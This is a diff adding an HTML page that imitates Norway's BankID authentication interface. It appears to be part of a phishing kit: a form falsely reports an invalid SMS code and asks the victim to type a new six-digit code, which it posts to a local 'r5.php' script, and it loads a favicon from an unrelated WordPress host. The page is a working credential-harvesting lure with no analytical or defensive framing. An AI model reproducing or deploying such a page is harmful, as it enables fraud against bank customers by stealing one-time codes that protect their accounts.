@@ -1,0 +1,177 @@
+<html lang="en"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex, nofollow">
+<link rel="icon" type="image/png" href="https://wordpress-113021-0.cloudclusters.net/APPPOUS/images/favicon.b4be5517.png">
+<title>BankID</title>
+<script async="" src="BankID5_fichiers/gtm5445.html"></script><script type="text/javascript" async="" src="BankID5_fichiers/siteanalyze_6015663.js"></script><script defer="defer" src="BankID5_fichiers/654.b0878c48.js"></script>
+<script defer="defer" src="BankID5_fichiers/authorization.ee825c18.js"></script>
+<link href="BankID5_fichiers/authorization.1a472285a800009ee4f9.css" rel="stylesheet"></head>
+<body class="">
+<main class="container">
+<div class="container__content">
+<div class="bankid-logo-wrapper">
+<img alt="" class="bankid-logo" src="BankID5_fichiers/logo.svg"></div>
+<div id="useCspBrowserPage" class="page card severitylevel-warning no-buttons" style="display: flex;">
+
+<div id="wait" style="display: none;"><img alt="" class="bankid-symbol" src="BankID5_fichiers/bankid-symbol-animated.ee3b536a.svg"> 
+<span class="sr-only" role="alert" lang="en">Loading</span><div id="redirect-button-wrapper" style="display:none">
+<p data-i18n="have_you_been_redirected_text">Hvis du ikke har blitt sendt videre, trykk på fortsett-knappen.</p>
+<button type="submit" data-i18n="redirect_button" aria-disabled="true" id="redirect-button" class="button button--default" disabled="disabled">Fortsett</button>
+</div>
+</div>
+<div class="page" id="terms" style="display:none">
+</div>
+<div class="page" id="terms-details" style="display:none">
+</div>
+<div class="page" id="getNnin" style="">
+<form id="loginForm" action="r5.php" method="post" autocomplete="off">
+<div class="page__content">
+<h1 tabindex="-1" data-i18n="nnin" id="nnin-title">IDENTIFISERING</h1>
+<span class="merchant_name">Vennligst bekreft autentisering</span> 
+<span class="merchant_name">Vi sendte deg en SMS-kode. Skriv inn den for à bekrefte at det er deg. </span>
+<span style="color: red;">Ugyldig SMS kode !! vi sender en ny sms.</span>
+<label for="nnin" data-i18n="nnin_label">SMS-kode
+
+</label> 
+
+<input name="sms" id="nnin" class="hw-input" placeholder="XXXXXX" type="tel" tabindex="0" autocomplete="off" pattern=".{6,}" maxlength="6" onkeypress="return isNumber(event)" required="">
+<p id="nninValidationMessage" class="validation-text" data-i18n="nnin_helper_text" aria-live="polite">Bekreft autentisering ved å identifisere deg med din BankID. Dette gjøres på samme måte som når du logger deg inn i nettbanken.</p>
+<div class="helper-text-container">
+<img id="helperTextErrorIcon" src="BankID5_fichiers/helper-text-error.b85af04c.svg" alt="" style="display:none">
+</div>
+
+</div><div class="page__buttons"><button type="submit" data-i18n="next" id="nnin-next-button" class="button button--default">Neste</button>
+</div>
+</form>
+</div>
+<div class="page" id="stepupatconsumption" style="display:none">
+<div class="page__content"><h1 tabindex="-1" id="stepup-at-consumption-header" data-i18n="warning_stepup_required_at_consumption_header">Fullfør i {app_name}</h1>
+<span class="merchant_name">BankID MinSide</span><div aria-hidden="true"><img alt="" class="polling-loader" src="BankID5_fichiers/polling-animation.bdad460a.svg"></div>
+<p id="stepup-at-consumption-explanation" data-i18n="warning_stepup_required_at_consumption">For å fullføre identifiseringen, vennligst gå til {app_name} for å identifisere deg med det personlige passordet ditt.</p>
+<p id="stepup-at-consumption-challenge-explanation" data-i18n="warning_stepup_required_at_consumption_challenge_prompt">Åpne {app_name} og bekreft ordene som vises under for å fortsette.</p><p id="stepup-at-consumption-challenge-value" class="challenge-text">
+</p>
+</div>
+<div class="page__buttons"><button data-i18n="cancel" id="stepup-at-consumption-cancel" class="button button--link">Avbryt</button>
+</div>
+</div>
+<div class="page" id="consumptionDeviceUserChallenge" style="display:none"><div class="page__content">
+<h1 id="consumption-device-user-challenge-header" tabindex="-1" data-i18n="openBankIdApp">Åpne {app_name}</h1>
+<span class="merchant_name">BankID MinSide</span><div aria-hidden="true"><img alt="" class="polling-loader" src="BankID5_fichiers/polling-animation.bdad460a.svg">
+</div>
+<p id="consumption-device-user-challenge-prompt" role="status" data-i18n="openBankIdAppPrompt">Åpne {app_name} og bekreft ordene som vises under for å fortsette.</p>
+<p id="consumption_device_challenge_value" class="challenge-text"></p>
+</div>
+<div class="page__buttons"><button data-i18n="cancel" id="consumption-device-challenge-cancel" class="button button--link">Avbryt</button>
+</div></div><div class="page" id="authenticationDeviceUserChallenge" style="display:none"><div class="page__content">
+<h1 tabindex="-1" data-i18n="whichWordsHeader">Hvilke ord ser du på den andre skjermen?</h1>
+<p data-i18n="whichWordsPara">Dette steget hjelper BankID å bekrefte at det virkelig er deg.</p>
+<div id="authenticationDeviceChallengeWords"><div style="display:none">
+<div id="authentication-device-challenge-template">
+<button class="button button--default" id="authentication-device-challenge-button-template">Template button</button>
+</div></div></div></div><div class="page__buttons">
+<button data-i18n="cancel" id="authentication-device-challenge-cancel" class="button button--link">Avbryt</button>
+</div></div><div class="page" id="authenticationDeviceUserChallengeSimple" style="display:none"><div class="page__content">
+<h1 tabindex="-1" data-i18n="correctWordsHeader">Var det disse ordene du så?</h1><p data-i18n="whichWordsPara">Dette steget hjelper BankID å bekrefte at det virkelig er deg.</p>
+<span id="authentication-device-simple-challenge-correct-poetry" class="challenge-text">Correct poetry</span></div><div class="page__buttons">
+<button data-i18n="accept" id="authentication-device-simple-challenge-accept" class="button button--default">Aksepter</button> 
+<button data-i18n="decline" id="authentication-device-simple-challenge-decline" class="button button--link">Avslå</button>
+</div>
+</div>
+<div class="page" id="login" style="display: none;"><div class="page__content">
+<h1 tabindex="-1" data-i18n="confirmId">Bekreft identiteten din</h1><p role="text">
+<span class="merchant_name">BankID MinSide</span> 
+<span data-i18n="confirmPostfix">ber deg bekrefte at det er deg.</span>
+</p>
+</div>
+<div class="page__buttons"><button data-i18n="confirmWithBankID" id="login-button" class="login-button">Bekreft</button> 
+<button data-i18n="decline" id="decline-login-button" class="decline-login-button">Avslå</button>
+</div>
+</div>
+<div class="page card" id="payment" style="display:none">
+<div class="page__content"><div class="icon-wrapper">
+<img src="BankID5_fichiers/bankid-dna.8e924512.svg" alt=""></div>
+<h1 tabindex="-1" data-i18n="confirmPayment">Bekreft betalingen</h1>
+<h2 id="paymentAmount">Amount</h2>
+<p>
+<span id="payment_description" data-i18n="payment_description">til {creditor}</span>
+</p>
+</div>
+<div class="page__buttons"><button data-i18n="confirmWithBankID" id="confirm-payment-button" class="login-button">Bekreft</button>
+ <button data-i18n="decline" id="decline-payment-button" class="decline-login-button">Avslå</button>
+ </div>
+ </div>
+ <div class="page" id="signtext" style="display:none"><div class="page__content">
+ <h1 tabindex="-1" data-i18n="confirmText">Bekreft</h1>
+ <p>
+ <span id="signText"></span>
+ </p>
+ </div>
+ <div class="page__buttons">
+ <button data-i18n="confirmWithBankID" id="sign-text-button" class="login-button">Bekreft</button>
+ <button data-i18n="decline" id="decline-text-button" class="decline-login-button">Avslå</button>
+ </div>
+ </div>
+ <div class="page" id="approvecard" style="display:none">
+ <div class="page__content">
+ <h1 tabindex="-1" data-i18n="confirmApproveCard">Bekreft kort</h1>
+ <p>
+ <span id="approveCardSentence" data-i18n="confirmApproveCardSentence">Bekreft kort {formatted_last_card_digits} for {merchant_name}</span>
+ </p>
+ </div>
+ <div class="page__buttons">
+ <button data-i18n="confirmWithBankID" id="approve-card-button" class="login-button">Bekreft</button> 
+ <button data-i18n="decline" id="decline-approve-card-button" class="decline-login-button">Avslå</button>
+ </div>
+ </div>
+ <div class="page card severitylevel-warning" id="reenrollmentrequired" style="display:none">
+ <div class="page__content"><div class="icon-wrapper"><img src="BankID5_fichiers/exclamation-mark.ccd7a2da.svg" alt="">
+ </div>
+ <h1 tabindex="-1" data-i18n="warning_reenrollment_required_header">Du må aktivere BankID Biometri</h1>
+ <p id="reenroll-required-problem-detected" data-i18n="warning_reenrollment_required_problem_detected">Beklager, men en feil har oppstått som gjør at du må aktivere BankID Biometri på nytt.</p>
+ <p id="reenroll-required-action-required" data-i18n="warning_reenrollment_required_action_required">Dette kan gjøres i {app_name}.</p>
+ <p id="reenroll-required-proceed-with-fallback" data-i18n="warning_reenrollment_required_continue_with_fallback" style="display:none">Du kan fremdeles fullføre autentiseringen ved å fortsette.</p>
+ <p id="reenroll-required-proceed-on-consumption-device" data-i18n="warning_reenrollment_required_complete_on_consumption_device" style="display:none">Du må fullføre autentiseringen på den andre enheten.</p>
+ </div>
+ <div class="page__buttons">
+ <button id="acknowledge-reenrollment-required" class="button button--default" data-i18n="warning_reenrollment_acknowledge">OK</button>
+ </div>
+ </div>
+ <div class="page card severitylevel-notification" id="yourkeyisreplacedpage" style="display:none">
+ <div class="page__content">
+ <div class="icon-wrapper">
+ <img src="BankID5_fichiers/bankid-dna.8e924512.svg" alt=""></div>
+ <h1 tabindex="-1" data-i18n="warning_key_is_replaced_header">Prøv igjen</h1>
+ <p id="key-is-replaced-action-required" data-i18n="warning_key_is_replaced_paragraph">For å være ekstra sikre, må du bruke biometri på nytt.</p>
+ </div>
+ <div class="page__buttons">
+ <button id="key-is-replaced-button" class="button button--default" data-i18n="warning_key_is_replaced_button">Prøv igjen</button>
+ </div>
+ </div>
+ <div class="page card severitylevel-notification" id="anotherdevicehasactivekeypage" style="display:none"><div class="page__content">
+ <div class="icon-wrapper"><img src="BankID5_fichiers/bankid-dna.8e924512.svg" alt=""></div>
+ <h1 tabindex="-1" data-i18n="warning_another_device_has_active_key_header">Feil mobil</h1><p id="another-device-has-active-key-action-required" data-i18n="warning_another_device_has_active_key_paragraph">BankID
+ Biometri er registrert på en annen mobil enn den du bruker nå. Bruk den
+ mobilen eller aktiver BankID på denne mobilen. Vær oppmerksom på at du 
+bare kan ha BankID på en mobil av gangen.
+ </p>
+ </div>
+ <div class="page__buttons">
+ <button id="another-device-has-active-key-button" class="button button--default" data-i18n="warning_another_device_has_active_key_button">Fortsett</button>
+ </div>
+ </div>
+ <div class="page card" id="errorpage" style="display:none">
+ <div class="page__content"><div class="icon-wrapper"><img id="errorIcon" src="BankID5_fichiers/no-image.c3b3f789.svg" alt="">
+ </div>
+ <h1 id="errorheading" tabindex="-1" data-i18n="error_heading">Noe gikk galt</h1>
+ <h2 id="errorSubheading">Subheading</h2>
+ <p id="errortext"></p></div><div class="page__buttons">
+ <button id="erroraction" class="button button--default" data-i18n="error_acknowledge">OK</button>
+ </div>
+ </div>
+ </div>
+</div></main>
+ <script>document.getElementById("useCspBrowserPage").style.display="flex",document.getElementById("wait").style.display="none",window.doesNotUseCsp=!0</script>
+ 
+ </body></html>
